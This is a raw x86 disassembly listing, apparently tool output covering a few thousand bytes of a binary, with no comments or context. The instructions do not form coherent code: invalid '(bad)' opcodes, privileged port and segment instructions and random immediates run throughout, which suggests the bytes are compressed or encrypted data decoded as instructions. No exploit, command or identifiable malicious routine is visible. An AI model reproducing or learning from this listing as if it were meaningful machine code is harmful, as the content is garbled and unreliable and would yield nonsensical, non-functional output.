  425ca8:	mov    DWORD PTR [esi],esp
  425caa:	push   ds
  425cab:	push   ebp
  425cac:	and    BYTE PTR [edx-0x65],cl
  425caf:	fwait
  425cb0:	mov    ds:0xa71d52c4,al
  425cb5:	mov    cl,0x7c
  425cb7:	dec    ebp
  425cb8:	pop    edx
  425cb9:	sub    eax,0x8beca7df
  425cbe:	mov    eax,0x5139edf9
  425cc3:	pop    ds
  425cc4:	ja     0x425cf1
  425cc6:	dec    ecx
  425cc7:	dec    DWORD PTR [ebp+0x31]
  425cca:	shl    BYTE PTR [ecx-0x31ae0a7e],0x43
  425cd1:	std    
  425cd2:	add    bh,al
  425cd4:	test   al,0x77
  425cd6:	lock pop ss
  425cd8:	stos   DWORD PTR es:[edi],eax
  425cd9:	add    DWORD PTR [esi+0x6d],esi
  425cdc:	into   
  425cdd:	sbb    ch,BYTE PTR [edx+0x23]
  425ce0:	xchg   ebp,eax
  425ce1:	retf   0xfa56
  425ce4:	ss test eax,0x364b58dd
  425cea:	das    
  425ceb:	test   DWORD PTR [esi],0xe9e1e84f
  425cf1:	ftst   
  425cf3:	inc    ecx
  425cf4:	(bad)  
  425cf5:	cmp    ecx,DWORD PTR [esi+edi*1-0x653a2332]
  425cfc:	out    dx,eax
  425cfd:	pop    eax
  425cfe:	retf   0x24a9
  425d01:	call   0x6795:0x1ccdb632
  425d08:	retf   0x6b49
  425d0b:	push   esp
  425d0c:	fwait
  425d0d:	mov    al,ds:0xa1
	...
  425d1a:	dec    edx
  425d1b:	xchg   DWORD PTR [edx+0x4c],edx
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi+0x206d210f],ecx
  425d27:	je     0x425cf4
  425d29:	xor    cl,BYTE PTR [ebp-0x2fffe2c]
  425d2f:	add    DWORD PTR [eax],eax
  425d31:	add    BYTE PTR [esi],al
  425d33:	jbe    0x425d09
  425d35:	lea    ecx,[edi]
  425d37:	into   
  425d38:	mov    DWORD PTR [ebp-0x7da35c86],0xf632517a
  425d42:	and    ch,cl
  425d44:	cmp    DWORD PTR [ebp+0x11],esi
  425d47:	call   0x2f5d:0x17a5a6fb
  425d4e:	add    ecx,DWORD PTR [eax-0x4e]
  425d51:	xor    DWORD PTR [edi],ebx
  425d53:	mov    ebp,0xa4806123
  425d58:	cmp    bl,ch
  425d5a:	enter  0xd0d7,0x21
  425d5e:	sub    bl,BYTE PTR [ecx+0x9]
  425d61:	out    0x39,al
  425d63:	push   cs
  425d64:	xchg   BYTE PTR [ebp+0x1ae63be4],dl
  425d6a:	dec    edi
  425d6b:	push   0x3113dc22
  425d70:	call   0x6ba3:0x45425523
  425d77:	or     ebp,DWORD PTR [bx+di+0x55]
  425d7b:	fnstcw WORD PTR [ecx-0x21]
  425d7e:	cs gs data16 aas 
  425d82:	lock jl 0x425db3
  425d85:	xchg   edx,eax
  425d86:	push   esp
  425d87:	ffreep st(4)
  425d89:	lods   eax,DWORD PTR ds:[esi]
  425d8a:	inc    ebp
  425d8b:	cmp    bh,BYTE PTR [eax]
  425d8d:	out    dx,al
  425d8e:	and    DWORD PTR [edi+0x12],esp
  425d91:	idiv   dh
  425d93:	pop    ds
  425d94:	mov    esi,0x18173559
  425d99:	mov    ecx,0xff4b960e
  425d9e:	sbb    eax,0x83399266
  425da3:	arpl   WORD PTR [ebp+0x63031f9a],ax
  425da9:	push   ss
  425daa:	call   0x19019c68
  425daf:	mov    esi,0x3968596b
  425db4:	mov    dl,0x98
  425db6:	xor    cl,0x20
  425db9:	test   BYTE PTR [ebx+esi*2+0x25],0x5d
  425dbe:	mov    ebp,0x39e6089f
  425dc3:	pop    eax
  425dc4:	repz jmp 0x83c62347
  425dca:	adc    eax,DWORD PTR [ebx+0x6a8372a0]
  425dd0:	ins    DWORD PTR es:[edi],dx
  425dd1:	sub    BYTE PTR [ebx+0x5e],0x44
  425dd5:	or     BYTE PTR [ecx-0x76701c7d],al
  425ddb:	or     eax,0xa2924c78
  425de0:	out    dx,al
  425de1:	and    BYTE PTR [esi+0x747bed8b],0x6c
  425de8:	jns    0x425def
  425dea:	fdiv   QWORD PTR [edx-0x4f2788dc]
  425df0:	test   BYTE PTR [edi],ah
  425df2:	inc    ebp
  425df3:	test   BYTE PTR [ebx+esi*8+0x34],ch
  425df7:	adc    edi,DWORD PTR [esi+eiz*4+0xa]
  425dfb:	sbb    DWORD PTR [ecx],0x2a194897
  425e01:	pop    edi
  425e02:	(bad)  
  425e04:	mov    edi,0xb4174701
  425e09:	sub    al,0x6e
  425e0b:	inc    esp
  425e0c:	pop    ebx
  425e0d:	and    BYTE PTR [edx],bl
  425e0f:	xor    eax,0xe040ebb2
  425e14:	sbb    ecx,DWORD PTR ds:0xaa4b27
  425e1a:	jmp    0x425e46
  425e1c:	push   ds
  425e1d:	sbb    BYTE PTR [edx+ebx*2],cl
  425e20:	test   DWORD PTR [ecx-0x3ed33c9d],ebx
  425e26:	imul   esp,DWORD PTR [eax],0xfffffff5
  425e29:	cli    
  425e2a:	jge    0x425df9
  425e2c:	popf   
  425e2d:	ds mov ah,0x80
  425e30:	test   BYTE PTR [ecx-0x1f052aa2],0xfa
  425e37:	cmp    BYTE PTR [ebp+0xdb462e7],bl
  425e3d:	sub    cl,BYTE PTR [edi]
  425e3f:	clc    
  425e40:	dec    eax
  425e41:	adc    edi,esp
  425e43:	push   esi
  425e44:	imul   esi,DWORD PTR [edx+0x1275afb4],0x53a5b03
  425e4e:	mov    edi,0xec7c5a19
  425e53:	daa    
  425e54:	xchg   ch,bl
  425e56:	(bad)  
  425e57:	pushf  
  425e58:	js     0x425e27
  425e5a:	or     edx,DWORD PTR [edi+ebx*1-0x145bdab0]
  425e61:	repnz cld 
  425e63:	mov    eax,0x432785bb
  425e68:	aam    0x8c
  425e6a:	sbb    dl,BYTE PTR [esi+0x2d]
  425e6d:	stos   BYTE PTR es:[edi],al
  425e6e:	fwait
  425e6f:	push   ds
  425e70:	lds    eax,FWORD PTR fs:[bp+di]
  425e74:	test   BYTE PTR [edi],dh
  425e76:	mov    esp,0x50ccad45
  425e7b:	mov    edx,0x302336f7
  425e80:	fdiv   DWORD PTR [ebx+edx*8]
  425e83:	pop    es
  425e84:	xchg   cl,dh
  425e86:	scas   al,BYTE PTR es:[edi]
  425e87:	sub    BYTE PTR [eax+eiz*8+0x71fcc20f],0xe4
  425e8f:	xor    ebp,DWORD PTR [edi+0x24]
  425e92:	fcomp  QWORD PTR [edx+0x35]
  425e95:	jle    0x425eb8
  425e97:	(bad)  
  425e99:	into   
  425e9a:	cs dec edi
  425e9c:	je     0x425f14
  425e9e:	sbb    ecx,ebp
  425ea0:	mov    ebx,0xf7537773
  425ea5:	add    al,0xde
  425ea7:	lock (bad) 
  425ea9:	lods   al,BYTE PTR ds:[esi]
  425eaa:	push   es
  425eab:	imul   eax,esi,0x25eb4561
  425eb1:	test   BYTE PTR [ebp+0x6139adb],al
  425eb7:	xor    eax,0x9de8e8eb
  425ebc:	fnsave [edi-0x6794a3b5]
  425ec2:	call   0xb57a5cd6
  425ec7:	inc    eax
  425ec8:	xchg   ecx,eax
  425ec9:	hlt    
  425eca:	adc    edx,ebx
  425ecc:	jnp    0x425e86
  425ece:	lds    ebx,FWORD PTR [edi-0x154eb26d]
  425ed4:	cmc    
  425ed5:	and    DWORD PTR [ecx-0x561156ca],0xffffffcb
  425edc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425edd:	or     cl,BYTE PTR [edi+0x2a]
  425ee0:	jge    0x425eb5
  425ee2:	xchg   ebp,eax
  425ee3:	js     0x425f15
  425ee5:	fnstenv ss:[edx]
  425ee8:	ins    DWORD PTR es:[edi],dx
  425ee9:	fcom   DWORD PTR [ebx+0x57]
  425eec:	or     al,BYTE PTR [ecx]
  425eee:	test   eax,0x9ec13b22
  425ef3:	hlt    
  425ef4:	mov    al,0x3a
  425ef6:	inc    edi
  425ef7:	and    ch,ah
  425ef9:	push   ds
  425efa:	js     0x425eca
  425efc:	leave  
  425efd:	add    ebx,esp
  425eff:	out    dx,eax
  425f00:	fst    DWORD PTR [ecx]
  425f02:	shr    ah,0xd7
  425f05:	into   
  425f06:	or     DWORD PTR [ecx+ecx*4+0x39199c00],esp
  425f0d:	jmp    0xb82dbd3a
  425f12:	dec    eax
  425f13:	in     eax,dx
  425f14:	adc    ebx,ebx
  425f16:	cli    
  425f17:	out    0xab,eax
  425f19:	pop    ecx
  425f1a:	daa    
  425f1b:	mov    ds:0xac96c21,eax
  425f20:	xbegin 0x493007fa
  425f26:	push   0x5548f014
  425f2b:	icebp  
  425f2c:	shl    DWORD PTR [edi+0x5e],cl
	...
  425f3a:	or     dl,BYTE PTR [edx-0x3c684]
  425f40:	dec    edi
  425f41:	mov    bl,0x9
  425f43:	sub    al,0x0
  425f45:	sub    esi,ebx
  425f47:	stos   DWORD PTR es:[edi],eax
  425f48:	call   0x218ea02
  425f4d:	add    ch,bh
  425f4f:	add    DWORD PTR [eax],eax
  425f51:	add    al,ch
  425f53:	pushf  
  425f54:	adc    BYTE PTR [eax-0x22],dl
  425f57:	push   0x1bfae01a
  425f5c:	mov    dh,BYTE PTR [esi+0x4c3c8d78]
  425f62:	sub    BYTE PTR [ebp-0x35],dh
  425f65:	iret   
  425f66:	js     0x425f1e
  425f68:	leave  
  425f69:	mov    al,ds:0xc88c2b95
  425f6e:	mov    eax,0x7350f7b3
  425f73:	fucom  st(4)
  425f75:	adc    cl,cl
  425f77:	xchg   edx,eax
  425f78:	cmc    
  425f79:	jns    0x425f9e
  425f7b:	ds pop ebx
  425f7d:	push   esp
  425f7e:	cmp    al,0xde
  425f80:	pushf  
  425f81:	push   0xbc580c8c
  425f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f87:	inc    ebp
  425f88:	xor    BYTE PTR [edx-0x4c977280],bh
  425f8e:	mov    esi,0x54bdfc50
  425f93:	test   DWORD PTR ds:0x39347782,ecx
  425f99:	dec    esi
  425f9a:	push   ecx
  425f9b:	shr    BYTE PTR [ebx],1
  425f9d:	inc    edi
  425f9e:	cwde   
  425f9f:	ror    al,0x8c
  425fa2:	pop    edx
  425fa3:	aad    0x93
  425fa5:	jo     0x425fbc
  425fa7:	sti    
  425fa8:	and    DWORD PTR [ebx],esi
  425faa:	or     DWORD PTR cs:[ebp+0x4c],0xdc3f6d7e
  425fb2:	ficomp DWORD PTR [esi+0x4e]
  425fb5:	dec    ebx
  425fb6:	xchg   BYTE PTR [eax+ebp*2],dh
  425fb9:	adc    esp,DWORD PTR [esi+0x4f]
  425fbc:	mov    cl,0xf9
  425fbe:	cmp    bh,bh
  425fc0:	jmp    DWORD PTR [ecx-0x45e9094f]
  425fc6:	je     0x42603f
  425fc8:	and    DWORD PTR [ebx-0xd97ae6e],0x2f
  425fcf:	jb     0x426011
  425fd1:	push   eax
  425fd2:	mov    esp,0x5e118598
  425fd7:	imul   edx,DWORD PTR [ecx+ebx*2+0x441a2fda],0x8d6f1ed3
  425fe2:	xchg   esp,eax
  425fe3:	mov    eax,0xae93df9d
  425fe8:	enter  0x8c11,0x3c
  425fec:	jo     0x425fa5
  425fee:	daa    
  425fef:	inc    ecx
  425ff0:	out    dx,al
  425ff1:	shl    BYTE PTR [ebx-0x21a162f5],1
  425ff7:	xchg   esp,eax
  425ff8:	mov    ecx,0xed81c524
  425ffd:	stc    
  425ffe:	cmp    al,0x3c
  426000:	cmp    bh,BYTE PTR [ebp-0x49]
  426003:	aam    0x1d
  426005:	(bad)
  426009:	out    dx,eax
  42600a:	push   ebp
  42600b:	in     al,dx
  42600c:	(bad)  [ebx]
  42600e:	or     edi,esi
  426010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426011:	ret    
  426012:	sar    ch,cl
  426014:	test   BYTE PTR [ebx-0x1342bf7e],ah
  42601a:	pop    es
  42601b:	sbb    ebp,DWORD PTR [esi]
  42601d:	jns    0x426091
  42601f:	inc    edi
  426020:	ror    DWORD PTR [ecx+ecx*1-0x5b],cl
  426024:	mov    eax,0x207369ef
  426029:	mov    ds:0xb7a16114,al
  42602e:	sub    bh,cl
  426030:	arpl   WORD PTR [eax+0x577d778f],cx
  426036:	and    al,0x4a
  426038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426039:	or     eax,0xb50b5b0d
  42603e:	ja     0x4260ad
  426040:	and    bh,BYTE PTR [eax-0x60]
  426043:	nop
  426044:	retf   
  426045:	(bad)  
  426047:	shl    BYTE PTR [eax+0x44],1
  42604a:	(bad)  
  42604b:	mov    ebp,0x1f281998
  426050:	fs pop ss
  426052:	fs mov esp,0x68d66bee
  426058:	pop    edx
  426059:	leave  
  42605a:	and    eax,0xbbd931b2
  42605f:	fnstenv [edi]
  426061:	loop   0x425fed
  426063:	sub    eax,0x3c474175
  426068:	fs das 
  42606a:	jecxz  0x426038
  42606c:	aas    
  42606d:	xchg   cx,ax
  42606f:	jne    0x426045
  426071:	test   ebp,ecx
  426073:	ret    0x5970
  426076:	iret   
  426077:	and    edx,DWORD PTR [edx]
  426079:	in     al,dx
  42607a:	fs and eax,0xf207d8b3
  426080:	scas   al,BYTE PTR es:[edi]
  426081:	pop    ebx
  426082:	lods   al,BYTE PTR ds:[esi]
  426083:	or     DWORD PTR ds:0x546e6dc9,edi
  426089:	xchg   edx,eax
  42608a:	scas   al,BYTE PTR es:[edi]
  42608b:	cli    
  42608c:	jno    0x42609a
  42608e:	in     al,dx
  42608f:	or     al,0xa3
  426091:	push   cs
  426092:	pusha  
  426093:	int3   
  426094:	repnz stc 
  426096:	mov    ch,0xcc
  426098:	mov    BYTE PTR [edi-0x5f94c33a],dl
  42609e:	cmp    DWORD PTR [edx-0x24],esi
  4260a1:	adc    DWORD PTR [ecx-0x32],edx
  4260a4:	or     al,0x73
  4260a6:	sbb    BYTE PTR [edi+0x397b6fa9],bh
  4260ac:	loop   0x4260e1
  4260ae:	addr16 add eax,0x5c58e5fa
  4260b4:	iret   
  4260b5:	imul   esp,DWORD PTR [esi-0x78dae5a9],0x42
  4260bc:	scas   eax,DWORD PTR es:[edi]
  4260bd:	cmp    bh,BYTE PTR [ecx]
  4260bf:	(bad)  
  4260c0:	cli    
  4260c1:	dec    esp
  4260c2:	cmp    BYTE PTR [ebx+0x4065d544],cl
  4260c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260c9:	ins    DWORD PTR es:[edi],dx
  4260ca:	mov    DWORD PTR [edi-0x5b],edi
  4260cd:	jl     0x42613d
  4260cf:	jbe    0x42613a
  4260d1:	mov    ah,0x99
  4260d3:	xor    eax,DWORD PTR [ecx+0x417cd186]
  4260d9:	(bad)  
  4260da:	fnsave [esi-0x5ca13b82]
  4260e0:	enter  0x364f,0xc8
  4260e4:	fbld   TBYTE PTR [ebx+0x147204b4]
  4260ea:	sbb    eax,0x456daf8a
  4260ef:	sub    DWORD PTR [ebx+0x363c5139],eax
  4260f5:	lods   eax,DWORD PTR ds:[esi]
  4260f6:	sub    ebp,edx
  4260f8:	jbe    0x426148
  4260fa:	add    al,0xa2
  4260fc:	adc    DWORD PTR [esi],ecx
  4260fe:	outs   dx,BYTE PTR ds:[esi]
  4260ff:	mov    ecx,0x7238ac92
  426104:	lea    esp,[ecx+0x61]
  426107:	jae    0x42613c
  426109:	(bad)  
  42610b:	dec    edi
  42610c:	shl    DWORD PTR [edx-0x15bf3078],0x88
  426113:	pop    ebp
  426114:	xchg   edi,eax
  426115:	iret   
  426116:	fs jns 0x426180
  426119:	dec    ebx
  42611a:	call   0xe562:0x2e4fcb7d
  426121:	mov    ds,WORD PTR [ebx]
  426123:	jge    0x4260f8
  426125:	sti    
  426126:	scas   al,BYTE PTR es:[edi]
  426127:	int    0xdf
  426129:	lods   al,BYTE PTR ds:[esi]
  42612a:	fnstcw WORD PTR [esp+esi*2-0x7]
  42612e:	sub    DWORD PTR [ecx+0x0],ebp
  426131:	addr16 sbb eax,0xe515f313
  426138:	ret    
  426139:	fistp  QWORD PTR [ecx+0x70]
  42613c:	adc    ecx,ebp
  42613e:	dec    esi
  42613f:	mov    al,ds:0xcfb09ca6
  426144:	pusha  
  426145:	dec    eax
  426146:	push   0xb500ed14
  42614b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42614c:	fwait
  42614d:	push   eax
  42614e:	inc    edx
	...
  426157:	add    BYTE PTR [eax],al
  426159:	add    bl,al
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	loop   0x4261df
  426168:	sbb    al,0x80
  42616a:	xchg   eax,ebx
  42616c:	add    DWORD PTR [eax],eax
  42616e:	std    
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    BYTE PTR [ecx+0x57b4c6dc],al
  426177:	ins    DWORD PTR es:[edi],dx
  426178:	test   BYTE PTR [esi],bl
  42617a:	lock push esp
  42617c:	sbb    al,0x39
  42617e:	sbb    eax,0x8dc023b7
  426183:	add    eax,0xb3efdc1d
  426188:	and    ecx,edi
  42618a:	sti    
  42618b:	mov    DWORD PTR [ebp-0x7b7f8538],esp
  426191:	inc    ebp
  426192:	xchg   ebp,eax
  426193:	xchg   esi,eax
  426194:	dec    esi
  426195:	imul   edx,DWORD PTR [ecx+0x3f],0x7e
  426199:	loop   0x4261fc
  42619b:	cmp    al,0x20
  42619d:	pop    ebp
  42619e:	xor    edi,DWORD PTR [ecx-0x33]
  4261a1:	loopne 0x426125
  4261a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261a4:	sub    eax,DWORD PTR [ebx]
  4261a6:	(bad)
  4261a9:	and    eax,0xe200ce6b
  4261ae:	xchg   ebp,eax
  4261af:	leave  
  4261b0:	(bad)  
  4261b1:	xor    DWORD PTR [ecx-0x5fe65d41],0x37
  4261b8:	outs   dx,BYTE PTR ds:[esi]
  4261b9:	sbb    cl,BYTE PTR [esi-0x445885d4]
  4261bf:	push   0x7c
  4261c1:	daa    
  4261c2:	push   es
  4261c3:	leave  
  4261c4:	imul   eax,DWORD PTR [ecx+esi*4-0x66a56277],0x7c
  4261cc:	dec    ebp
  4261cd:	xchg   ecx,eax
  4261ce:	lods   eax,DWORD PTR ds:[esi]
  4261cf:	or     DWORD PTR [edx],esp
  4261d1:	xor    eax,DWORD PTR ds:0xb8399f74
  4261d7:	jns    0x42624b
  4261d9:	pushf  
  4261da:	jp     0x4261ce
  4261dc:	mov    bl,0x5a
  4261de:	cmp    BYTE PTR [edx-0x29],ch
  4261e1:	ins    DWORD PTR es:[edi],dx
  4261e2:	cmp    dh,BYTE PTR [ecx]
  4261e4:	retf   
  4261e5:	test   eax,0x9221ae95
  4261ea:	adc    BYTE PTR ss:[esi],0xa2
  4261ee:	or     eax,0x3172417e
  4261f3:	xchg   ebp,eax
  4261f4:	xchg   ebx,eax
  4261f5:	(bad)  
  4261f6:	jp     0x42621d
  4261f8:	dec    edi
  4261f9:	ror    BYTE PTR [esi],1
  4261fb:	je     0x4261b5
  4261fd:	aas    
  4261fe:	loop   0x426186
  426200:	adc    eax,0x25b9ed6c
  426205:	push   ebx
  426206:	push   ebx
  426207:	imul   edx,DWORD PTR [ecx-0x3600a675],0xffffffee
  42620e:	inc    eax
  42620f:	mov    eax,0xc70e9e08
  426214:	and    eax,0x4b3c378c
  426219:	pop    eax
  42621a:	in     al,0xba
  42621c:	cli    
  42621d:	ror    BYTE PTR [esp+edx*4],cl
  426220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426221:	sub    DWORD PTR [eax],eax
  426223:	mov    al,0x43
  426225:	jnp    0x4261eb
  426227:	jp     0x426223
  426229:	push   edx
  42622a:	inc    ecx
  42622b:	push   esi
  42622c:	gs cmp eax,0x1e4a6775
  426232:	dec    ebp
  426233:	push   ecx
  426234:	xchg   BYTE PTR [esi+0x6a09d63],dl
  42623a:	fadd   DWORD PTR ds:[ebx+0x57037f59]
  426241:	sbb    al,ah
  426243:	jle    0x4261c9
  426245:	pop    esi
  426246:	mov    eax,0xbbd54dfe
  42624b:	jo     0x42624c
  42624d:	pop    edi
  42624e:	xchg   ecx,eax
  42624f:	(bad)
  426253:	push   eax
  426254:	cmp    DWORD PTR [ecx-0x52],ecx
  426257:	mov    DWORD PTR [ebx-0x6f],edi
  42625a:	or     eax,0x5eb09546
  426260:	cmp    esi,DWORD PTR [edx-0x754c930d]
  426266:	jp     0x4262a4
  426268:	jne    0x4262d7
  42626a:	dec    edx
  42626b:	xlat   BYTE PTR ds:[ebx]
  42626c:	in     eax,dx
  42626d:	cld    
  42626e:	adc    esp,DWORD PTR [ebp+0x4c59f256]
  426274:	cmc    
  426275:	cli    
  426276:	retf   
  426277:	bound  esp,QWORD PTR [eax]
  426279:	fsub   DWORD PTR [ebp+0x61]
  42627c:	fidiv  DWORD PTR [edx+0x4f]
  42627f:	enter  0x8071,0x79
  426283:	mov    ds:0x7f2c108,eax
  426288:	les    esi,FWORD PTR [ecx]
  42628a:	aaa    
  42628b:	add    ecx,DWORD PTR [ebp+0x6d9fd14e]
  426291:	jmp    0x426288
  426293:	jae    0x426232
  426295:	out    0x29,eax
  426297:	fdiv   DWORD PTR [ecx+0x49ffda04]
  42629d:	(bad)  
  42629e:	sti    
  42629f:	mov    eax,0x641b4ccf
  4262a4:	or     al,0xe6
  4262a6:	sahf   
  4262a7:	in     al,0xee
  4262a9:	add    al,0x4d
  4262ab:	add    dl,dh
  4262ad:	dec    esi
  4262ae:	jg     0x4262be
  4262b0:	jno    0x42628e
  4262b2:	retf   
  4262b3:	and    al,0x92
  4262b5:	ss or  al,0x2e
  4262b8:	push   edx
  4262b9:	xchg   BYTE PTR [ebx+0x6e],ah
  4262bc:	push   eax
  4262bd:	adc    eax,0xc59fd7b3
  4262c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262c3:	repnz sbb DWORD PTR [ebx],ecx
  4262c6:	mov    cs,WORD PTR [eax+ebp*2-0x61df31bc]
  4262cd:	cmp    esp,0x70
  4262d0:	xchg   edi,eax
  4262d1:	push   ecx
  4262d2:	xchg   edx,eax
  4262d3:	fisubr DWORD PTR [ecx]
  4262d5:	xchg   esp,eax
  4262d6:	mov    eax,ds:0xe9ea4b65
  4262db:	inc    ebp
  4262dc:	mov    bl,0x27
  4262de:	fldenv [edi+0x24727329]
  4262e4:	jg     0x426309
  4262e6:	enter  0xf8c5,0xd2
  4262ea:	stos   DWORD PTR es:[edi],eax
  4262eb:	adc    bl,BYTE PTR [ebp-0x5c376725]
  4262f1:	pop    esi
  4262f2:	int    0x9a
  4262f4:	xor    BYTE PTR [eax+eax*8],al
  4262f7:	call   0x592f8422
  4262fc:	in     eax,0x1d
  4262fe:	lods   eax,DWORD PTR ds:[esi]
  4262ff:	das    
  426300:	loope  0x426310
  426302:	data16 jge 0x42632d
  426305:	enter  0xd88c,0x70
  426309:	std    
  42630a:	jg     0x42635f
  42630c:	imul   DWORD PTR [eax]
  42630e:	mov    eax,0x6eb363c6
  426313:	dec    edi
  426314:	fsub   DWORD PTR [ebp-0x5ec71a77]
  42631a:	mov    ds:0xdd15d100,al
  42631f:	and    dh,cl
  426321:	pop    ebp
  426322:	xor    al,0xbf
  426324:	fnstsw WORD PTR [edx-0x6]
  426327:	inc    ebp
  426328:	(bad)  
  426329:	es in  al,dx
  42632b:	pop    eax
  42632c:	mov    al,ds:0xb0d48939
  426331:	test   ch,dh
  426333:	fisttp WORD PTR [ebx-0x7a1dc664]
  426339:	jo     0x4262f6
  42633b:	(bad)  
  42633c:	cmp    al,0x9d
  42633e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42633f:	push   esp
  426340:	xchg   DWORD PTR [edx+edi*2],edi
  426343:	inc    edi
  426344:	sub    bl,ah
  426346:	inc    ebx
  426347:	mov    bh,0xee
  426349:	aaa    
  42634a:	test   al,0x95
  42634c:	mov    ch,0xe2
  42634e:	push   ds
  42634f:	push   ecx
  426350:	in     eax,dx
  426351:	in     eax,dx
  426352:	ins    BYTE PTR es:[edi],dx
  426353:	jb     0x426361
  426355:	retf   
  426356:	(bad)  
  426358:	add    edx,esp
  42635a:	test   BYTE PTR [edi+0x3a],ch
  42635d:	shl    ah,0xb4
  426360:	dec    ecx
  426361:	pusha  
  426362:	ss es fcmovu st,st(3)
  426366:	lods   al,BYTE PTR ds:[esi]
  426367:	push   ebx
  426368:	inc    ecx
  426369:	mov    ah,0x45
  42636b:	sbb    dl,bl
  42636d:	sar    BYTE PTR [eax+0x0],0x0
  426374:	add    BYTE PTR [eax],al
  426376:	add    BYTE PTR [eax],al
  426378:	add    BYTE PTR [eax],al
  42637a:	call   0x9eff:0xefe9ef59
  426381:	jnp    0x42638f
  426383:	push   esi
  426384:	mov    ss,ebx
  426386:	push   edx
  426387:	je     0x4263d4
  426389:	sbb    DWORD PTR [edx+ebx*8+0x1fd0001],eax
  426390:	add    BYTE PTR [eax],al
  426392:	outs   dx,DWORD PTR ds:[esi]
  426393:	test   BYTE PTR [ebp+0x63],0xa6
  426397:	dec    ebp
  426398:	xchg   ecx,eax
  426399:	pop    ebp
  42639a:	jae    0x4263d3
  42639c:	pop    ds
  42639d:	clc    
  42639e:	jmp    0x42640d
  4263a0:	mov    bl,0x6f
  4263a3:	mov    bh,0x75
  4263a5:	dec    edx
  4263a6:	test   BYTE PTR [ecx],dl
  4263a8:	pop    edi
  4263a9:	jmp    0x426399
  4263ab:	not    ebp
  4263ad:	out    0x8d,al
  4263af:	loop   0x426372
  4263b1:	cmp    ah,al
  4263b3:	cs sbb eax,0xcd915115
  4263b9:	and    DWORD PTR ds:[ebx],ebx
  4263bc:	and    BYTE PTR [edx],ah
  4263be:	test   al,0xbe
  4263c0:	jns    0x4263bb
  4263c2:	pop    es
  4263c3:	mov    eax,ds:0xb921b013
  4263c8:	sbb    DWORD PTR [ecx-0x2c725887],ebx
  4263ce:	push   eax
  4263cf:	jbe    0x426381
  4263d1:	adc    eax,0xf236c15e
  4263d6:	cld    
  4263d7:	pop    eax
  4263d8:	ja     0x4263da
  4263da:	(bad)  
  4263db:	pop    eax
  4263dc:	mov    BYTE PTR gs:[ecx+0x2b762b94],dh
  4263e3:	nop
  4263e4:	out    dx,eax
  4263e5:	jge    0x4263fd
  4263e7:	not    BYTE PTR ds:0xa6b9272e
  4263ed:	mov    fs,ebx
  4263ef:	sbb    bh,BYTE PTR [ebx-0x6542c565]
  4263f5:	and    cl,BYTE PTR [ebx+0xf]
  4263f8:	jnp    0x42640b
  4263fa:	repz or DWORD PTR [esi],ecx
  4263fd:	push   edi
  4263fe:	mov    BYTE PTR [ebx-0x21480ad2],bl
  426404:	mov    ecx,0x7f4771
  426409:	mov    ebp,0xd5b67297
  42640e:	call   DWORD PTR [ebp+0x6]
  426411:	test   BYTE PTR [eax],bh
  426413:	and    eax,0x687aac89
  426418:	(bad)  
  426419:	adc    al,BYTE PTR [ecx-0x37]
  42641c:	sti    
  42641d:	cwde   
  42641e:	aam    0xa0
  426420:	scas   al,BYTE PTR es:[edi]
  426421:	add    al,0x15
  426423:	mov    esi,0xa68780cf
  426428:	or     BYTE PTR [edi],0xda
  42642b:	jo     0x4263e0
  42642d:	and    ch,bh
  42642f:	test   eax,0x8154549
  426434:	aam    0x15
  426436:	out    dx,al
  426437:	pop    esp
  426438:	pop    esi
  426439:	push   cs
  42643a:	sbb    eax,0xa3c4f53
  42643f:	push   0xffffffcc
  426441:	xchg   BYTE PTR [ebp+0x121e0e46],ah
  426447:	out    dx,eax
  426448:	dec    ebx
  426449:	jl     0x426459
  42644b:	pop    edx
  42644c:	pop    ebp
  42644d:	leave  
  42644e:	daa    
  42644f:	add    BYTE PTR [eax-0x10],0x23
  426453:	jp     0x42645c
  426455:	add    esi,ecx
  426457:	jmp    0x2efd:0xb4ecfad7
  42645e:	mov    ch,0xf3
  426460:	leave  
  426461:	dec    edi
  426462:	mov    BYTE PTR [edx],cl
  426464:	xchg   esi,eax
  426465:	fs jb  0x4264bd
  426468:	pop    es
  426469:	stc    
  42646a:	nop
  42646b:	lahf   
  42646c:	sbb    esp,DWORD PTR [edx]
  42646e:	cdq    
  42646f:	push   eax
  426470:	push   0xffffff90
  426472:	pushf  
  426473:	test   BYTE PTR [ebp-0x13],bl
  426476:	xchg   ebp,eax
  426478:	and    BYTE PTR [edi-0x3db2cfc4],ah
  42647e:	xchg   edi,eax
  42647f:	cmp    eax,0x14c770e8
  426484:	rol    bh,1
  426486:	inc    eax
  426487:	pop    esi
  426488:	pop    edi
  426489:	sbb    ch,BYTE PTR [ecx+eiz*8+0x73697365]
  426490:	adc    DWORD PTR gs:[edi+0x6f],edx
  426494:	xchg   edx,eax
  426495:	and    al,BYTE PTR [edi]
  426497:	rcr    cl,0x33
  42649a:	pop    ecx
  42649b:	dec    edi
  42649c:	test   DWORD PTR [edi+0x33363bb0],esi
  4264a2:	sub    esp,DWORD PTR [ebx+0x71]
  4264a5:	pop    ebp
  4264a6:	ds add bh,ch
  4264a9:	inc    ecx
  4264aa:	aas    
  4264ab:	mov    eax,ds:0x2c023270
  4264b0:	xor    al,0xb3
  4264b2:	jmp    0x4141c7c0
  4264b7:	lock repz cdq 
  4264ba:	cmp    DWORD PTR [eax],esp
  4264bc:	push   ds
  4264bd:	jp     0x426483
  4264bf:	mov    ebp,0x5d2280ed
  4264c4:	pop    ds
  4264c5:	(bad)  
  4264c7:	test   al,0xc0
  4264c9:	mov    dl,0x51
  4264cb:	sub    eax,DWORD PTR ds:0x808aaf58
  4264d1:	loop   0x42645c
  4264d3:	sub    BYTE PTR [edx-0x6a],al
  4264d6:	mov    edi,0xbe58b346
